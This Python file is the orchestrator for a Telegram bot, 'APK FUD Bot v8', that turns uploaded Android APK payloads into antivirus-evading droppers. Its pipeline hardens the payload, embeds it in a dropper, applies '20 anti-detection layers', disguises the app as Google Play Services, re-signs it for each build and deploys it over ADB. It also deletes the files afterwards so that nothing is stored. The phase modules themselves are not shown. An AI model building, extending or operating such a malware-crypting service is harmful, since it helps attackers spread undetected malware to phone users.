#!/usr/bin/env python3
"""
APK FUD Bot v8 — Definitive 7-Phase Strategy (50 Steps)

WORKFLOW (EXACT from strategy):
Phase 0: Extract Payload Properties (aapt)
Phase 1: Payload Hardening (9 steps) → output.apk
Phase 2: Dropper Code Edits (13 edits) → dropper_ready.apk
Phase 3: Identity + EMBED Payload → dropper_embedded.apk
Phase 4: Dropper Hardening (11 NP functions) → dropper_hardened.apk
Phase 5: PC Tool Pipeline (5 steps) → dropper_pc.apk
Phase 6: Final Sign (fresh keystore V1+V2+V3) → dropper_final_signed.apk
Phase 7: Deploy (ADB install)

20 Anti-Detection Layers. EMBED payload in assets/. NO server-side.
"""
import os, sys, shutil, asyncio, traceback, time, re
from pathlib import Path
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

from config import (
    TELEGRAM_TOKEN, INPUT_DIR, OUTPUT_DIR, TEMP_DIR, CLONE_DIR,
    MAX_FILE_SIZE, ANDROID_DEVICE_IP
)
from utils.logger import setup_logger, get_last_lines
from utils.adb_helper import adb_connect

import phases.phase0_extract
import phases.phase1_payload_hardening
import phases.phase2_dropper_edits
import phases.phase3_identity_embed
import phases.phase4_dropper_hardening
import phases.phase5_pc_pipeline
import phases.phase6_final_sign
import phases.phase7_deploy

logger = setup_logger()

# Global queue — one file at a time
_BUILD_QUEUE = asyncio.Queue()
_CURRENT_TASK = None
_CANCELLED = False

# Estimated phase durations (seconds) for ETA calculation
_PHASE_DURATIONS = {
    0: 3,
    1: 50,
    2: 10,
    3: 15,
    4: 20,
    5: 20,
    6: 8,
    7: 10,
}
_TOTAL_EST = sum(_PHASE_DURATIONS.values())  # ~136s (~2m 16s)


# ============================================================
# TELEGRAM COMMANDS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"APK FUD Bot v8 \u2014 Definitive 7-Phase Strategy\n\n"
        f"Namaste {user.first_name}!\n\n"
        f"Bot: @FUD404BOT\n"
        f"Link: https://t.me/FUD404BOT\n\n"
        f"7-Phase Workflow (50 Steps):\n"
        f"  Phase 0: Extract Properties\n"
        f"  Phase 1: Payload Hardening (9 steps)\n"
        f"  Phase 2: Dropper Code Edits (13 edits)\n"
        f"  Phase 3: Identity + EMBED\n"
        f"  Phase 4: Dropper Hardening (11 NP)\n"
        f"  Phase 5: PC Tool Pipeline (5 steps)\n"
        f"  Phase 6: Final Sign (V1+V2+V3)\n"
        f"  Phase 7: Deploy\n\n"
        f"20 Anti-Detection Layers\n"
        f"EMBED payload in assets/ (NO server-side)\n"
        f"Fresh SHA384withRSA per build\n\n"
        f"Commands:\n"
        f"/start \u2014 Info\n"
        f"/dropper <apk> \u2014 Build dropper\n"
        f"/fud <apk> \u2014 Run full pipeline\n"
        f"/status \u2014 Status\n"
        f"/help \u2014 Commands\n"
        f"/logs \u2014 Logs\n"
        f"/cancel \u2014 Cancel current build\n\n"
        f"Send .apk file as document \u2192 auto full pipeline"
    )


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from utils.adb_helper import _run
    from config import ADB
    adb_ok = _run([ADB, "devices"])[0]
    adb_text = "Connected" if adb_ok else "Not connected"
    qsize = _BUILD_QUEUE.qsize()
    await update.message.reply_text(
        f"Status:\n"
        f"ADB: {adb_text}\n"
        f"Device IP: {ANDROID_DEVICE_IP or 'Not set'}\n"
        f"Queue: {qsize} file(s) pending\n"
        f"Input: {INPUT_DIR}\n"
        f"Output: {OUTPUT_DIR}\n"
        f"Workflow: 7 phases \u00b7 50 steps\n"
        f"Anti-layers: 20\n"
        f"Send .apk to start!"
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Commands:\n\n"
        "/start \u2014 Bot info\n"
        "/status \u2014 ADB + paths\n"
        "/help \u2014 This message\n"
        "/logs \u2014 Last 50 log lines\n"
        "/cancel \u2014 Cancel current build\n"
        "/dropper <apk> \u2014 Build dropper\n"
        "/fud <apk> \u2014 Full 7-phase pipeline\n\n"
        "Send .apk as document \u2014 Auto pipeline"
    )


async def logs_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = get_last_lines(50)
    if len(lines) > 4000:
        lines = lines[-4000:]
    await update.message.reply_text(f"Last logs:\n```\n{lines}\n```", parse_mode="Markdown")


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _CANCELLED
    _CANCELLED = True
    await update.message.reply_text("Cancelling current build...")


async def _cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _CANCELLED
    query = update.callback_query
    await query.answer()
    _CANCELLED = True
    await query.edit_message_text("Cancelling current build...")


# ============================================================
# ETA HELPERS (show REMAINING time)
# ============================================================
_PHASE_NAMES = {
    0: "Phase 0: Extract Properties",
    1: "Phase 1: Payload Hardening (9 steps)",
    2: "Phase 2: Dropper Code Edits (13 edits)",
    3: "Phase 3: Identity + EMBED",
    4: "Phase 4: Dropper Hardening (11 NP)",
    5: "Phase 5: PC Tool Pipeline (5 steps)",
    6: "Phase 6: Final Sign (V1+V2+V3)",
    7: "Phase 7: Deploy",
    8: "Complete",
}


def _fmt_time(secs):
    if secs < 60:
        return f"{int(secs)}s"
    return f"{int(secs // 60)}m {int(secs % 60)}s"


async def _update_status(msg, phase_num, start_time, queue_pos=None):
    """Update Telegram status message with REMAINING time."""
    elapsed = time.time() - start_time
    # Calculate remaining based on estimated phase durations
    remaining = sum(_PHASE_DURATIONS.get(p, 10) for p in range(phase_num, 8))
    # Adjust with actual elapsed for current phase
    phase_est = _PHASE_DURATIONS.get(phase_num, 10)
    phase_elapsed = elapsed - sum(_PHASE_DURATIONS.get(p, 10) for p in range(phase_num))
    if phase_elapsed < phase_est:
        remaining = remaining - phase_est + (phase_est - phase_elapsed)
    else:
        remaining = max(remaining - phase_est, 0)
    remaining = max(int(remaining), 0)

    q_text = f"\nQueue: #{queue_pos} of {queue_pos + _BUILD_QUEUE.qsize()}" if queue_pos else ""
    full_text = (f"⏳ {_PHASE_NAMES[phase_num]}\n"
                f"⏰ Elapsed: {_fmt_time(elapsed)} | Remaining: ~{_fmt_time(remaining)}"
                f"{q_text}")
    try:
        # Add cancel button
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
        await msg.edit_text(full_text, reply_markup=keyboard)
    except Exception:
        pass


def _check_cancelled():
    global _CANCELLED
    if _CANCELLED:
        _CANCELLED = False
        raise Exception("Build cancelled by user")


# ============================================================
# 7-PHASE PIPELINE ORCHESTRATOR
# ============================================================
async def run_pipeline(apk_path, msg):
    """Run the exact 7-phase pipeline."""
    global _CANCELLED
    _CANCELLED = False
    start_time = time.time()

    # Clean temp
    shutil.rmtree(TEMP_DIR, ignore_errors=True)
    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    try:
        # Phase 0
        _check_cancelled()
        await _update_status(msg, 0, start_time)
        base_info = phases.phase0_extract.run(apk_path)
        _check_cancelled()

        # Phase 1
        await _update_status(msg, 1, start_time)
        output_apk = phases.phase1_payload_hardening.run(apk_path, base_info)
        _check_cancelled()

        # Phase 2
        await _update_status(msg, 2, start_time)
        dropper_ready = phases.phase2_dropper_edits.run(base_info)
        _check_cancelled()

        # Phase 3
        await _update_status(msg, 3, start_time)
        dropper_embedded = phases.phase3_identity_embed.run(dropper_ready, output_apk, base_info)
        _check_cancelled()

        # Phase 4
        await _update_status(msg, 4, start_time)
        dropper_hardened = phases.phase4_dropper_hardening.run(dropper_embedded)
        _check_cancelled()

        # Phase 5
        await _update_status(msg, 5, start_time)
        dropper_pc = phases.phase5_pc_pipeline.run(dropper_hardened, base_info)
        _check_cancelled()

        # Phase 6
        await _update_status(msg, 6, start_time)
        dropper_final = phases.phase6_final_sign.run(dropper_pc)
        _check_cancelled()

        # Phase 7
        await _update_status(msg, 7, start_time)
        phases.phase7_deploy.run(dropper_final)

        # Save output — same name as original payload (per strategy Phase 6.3)
        final_name = os.path.basename(apk_path)
        final_path = str(OUTPUT_DIR / final_name)
        shutil.copy(dropper_final, final_path)

        await _update_status(msg, 8, start_time)
        return final_path, None

    except Exception as e:
        if "cancelled" in str(e).lower():
            await msg.edit_text("❌ Build cancelled by user.")
            return None, "cancelled"
        logger.error(f"[!] Pipeline error: {e}", exc_info=True)
        await msg.edit_text(f"❌ Pipeline failed:\n{str(e)[:300]}")
        return None, str(e)


# ============================================================
# QUEUE WORKER — processes one file at a time
# ============================================================
async def _queue_worker():
    """Process build queue sequentially, one file at a time.
    After sending result, delete uploaded payload + output (no storage).
    """
    while True:
        try:
            apk_path, chat_id, bot = await _BUILD_QUEUE.get()
            pos = 1
            qsize = _BUILD_QUEUE.qsize()
            logger.info(f"[*] Processing queue item #{pos}, {qsize} remaining")

            msg = await bot.send_message(
                chat_id=chat_id,
                text=f"⏳ Starting build...\nQueue: 1 of {1 + qsize}"
            )

            if ANDROID_DEVICE_IP:
                adb_connect(ANDROID_DEVICE_IP)

            final_apk, error = await run_pipeline(apk_path, msg)

            if final_apk and os.path.exists(final_apk) and error != "cancelled":
                size_mb = os.path.getsize(final_apk) / (1024 * 1024)
                with open(final_apk, 'rb') as f:
                    await bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        filename=os.path.basename(final_apk),
                        caption=(f"Dropper Built!\n"
                                f"Size: {size_mb:.2f} MB\n\n"
                                f"7-Phase Complete:\n"
                                f"  Phase 1: Payload Hardened\n"
                                f"  Phase 2-3: Dropper + EMBED\n"
                                f"  Phase 4-6: Hardened + Signed V1+V2+V3\n"
                                f"SHA384withRSA | Google Play Services\n"
                                f"Package: {os.path.basename(apk_path)}")
                    )
                try:
                    await msg.delete()
                except Exception:
                    pass

                # ✅ CLEANUP: Delete uploaded payload + output (no storage)
                logger.info(f"[*] Cleaning up {os.path.basename(apk_path)}...")
                try:
                    if os.path.exists(apk_path):
                        os.remove(apk_path)
                except Exception:
                    pass
                try:
                    if os.path.exists(final_apk):
                        os.remove(final_apk)
                except Exception:
                    pass
                # Clean temp dir too
                try:
                    shutil.rmtree(TEMP_DIR, ignore_errors=True)
                except Exception:
                    pass
                logger.info("[+] Cleanup done — no files stored")

            elif error == "cancelled":
                # Also cleanup on cancel
                try:
                    if os.path.exists(apk_path):
                        os.remove(apk_path)
                except Exception:
                    pass
                try:
                    shutil.rmtree(TEMP_DIR, ignore_errors=True)
                except Exception:
                    pass
            else:
                await bot.send_message(chat_id=chat_id, text=f"❌ Pipeline failed:\n{error or 'Unknown error'}")
                try:
                    await msg.delete()
                except Exception:
                    pass
                # Cleanup even on failure
                try:
                    if os.path.exists(apk_path):
                        os.remove(apk_path)
                except Exception:
                    pass
                try:
                    shutil.rmtree(TEMP_DIR, ignore_errors=True)
                except Exception:
                    pass

            _BUILD_QUEUE.task_done()

        except Exception as e:
            logger.error(f"[!] Queue worker error: {e}", exc_info=True)
            _BUILD_QUEUE.task_done()
            await asyncio.sleep(2)


# ============================================================
# COMMAND HANDLERS
# ============================================================
async def dropper_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: /dropper <base.apk>\n\n"
            "Runs the full 7-phase pipeline:\n"
            "Phase 0-1: Harden payload\n"
            "Phase 2-3: Build + EMBED dropper\n"
            "Phase 4-6: Harden + sign\n"
            "Phase 7: Deploy"
        )
        return

    apk_name = args[0]
    apk_path = str(INPUT_DIR / apk_name)
    if not os.path.exists(apk_path):
        await update.message.reply_text(f"APK not found: {apk_name}")
        return

    qsize = _BUILD_QUEUE.qsize()
    await _BUILD_QUEUE.put((apk_path, update.effective_chat.id, context.bot))
    await update.message.reply_text(
        f"APK queued! ({1 + qsize} in queue)\n"
        f"Processing one file at a time..."
    )


async def fud_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /fud <apk.apk>")
        return

    apk_name = args[0]
    apk_path = str(INPUT_DIR / apk_name)
    if not os.path.exists(apk_path):
        await update.message.reply_text(f"APK not found: {apk_name}")
        return

    qsize = _BUILD_QUEUE.qsize()
    await _BUILD_QUEUE.put((apk_path, update.effective_chat.id, context.bot))
    await update.message.reply_text(
        f"APK queued! ({1 + qsize} in queue)\n"
        f"Processing one file at a time..."
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload: auto full 7-phase pipeline (queued)."""
    file = update.message.document
    if not file or not file.file_name:
        await update.message.reply_text("Send .apk file as document!")
        return
    if not file.file_name.lower().endswith('.apk'):
        await update.message.reply_text("Only .apk files!")
        return

    msg = await update.message.reply_text("Downloading APK...")

    try:
        file_obj = await file.get_file()
        apk_path = str(INPUT_DIR / file.file_name)
        await file_obj.download_to_drive(apk_path)

        size = os.path.getsize(apk_path)
        if size > MAX_FILE_SIZE:
            await msg.edit_text(f"File too big: {size / (1024 * 1024):.1f}MB > 100MB")
            os.remove(apk_path)
            return

        qsize = _BUILD_QUEUE.qsize()
        await msg.edit_text(
            f"APK Downloaded ({size / (1024 * 1024):.2f} MB)\n"
            f"Queue position: #{1 + qsize}\n"
            f"Processing one file at a time..."
        )

        await _BUILD_QUEUE.put((apk_path, update.effective_chat.id, context.bot))

    except Exception as e:
        logger.error(f"[!] Error: {e}", exc_info=True)
        await msg.edit_text(f"Error: {str(e)[:300]}")


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")


# ============================================================
# MAIN
# ============================================================
def main():
    if not TELEGRAM_TOKEN:
        print("[!] TELEGRAM_BOT_TOKEN missing!")
        sys.exit(1)

    for d in [INPUT_DIR, OUTPUT_DIR, TEMP_DIR, CLONE_DIR]:
        d.mkdir(parents=True, exist_ok=True)

    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("logs", logs_cmd))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CommandHandler("dropper", dropper_cmd))
    app.add_handler(CommandHandler("fud", fud_cmd))
    app.add_handler(CallbackQueryHandler(_cancel_callback, pattern="^cancel$"))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    app.add_error_handler(error_handler)

    # Start queue worker
    asyncio.get_event_loop().create_task(_queue_worker())

    print("[+] APK FUD Bot v8 — Definitive 7-Phase Strategy")
    print("[+] Telegram: @FUD404BOT")
    print("[+] Link: https://t.me/FUD404BOT")
    print("[+] 7 Phases \u00b7 50 Steps \u00b7 20 Anti-Detection Layers")
    print("[+] EMBED payload in assets/ (NO server-side)")
    print("[+] Signing: SHA384withRSA (fresh per build)")
    print("[+] Queue: sequential (one file at a time)")
    print("[+] ETA: remaining time shown")
    print("[+] Cancel: /cancel or inline button")
    print("[+] Ready for APK files...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
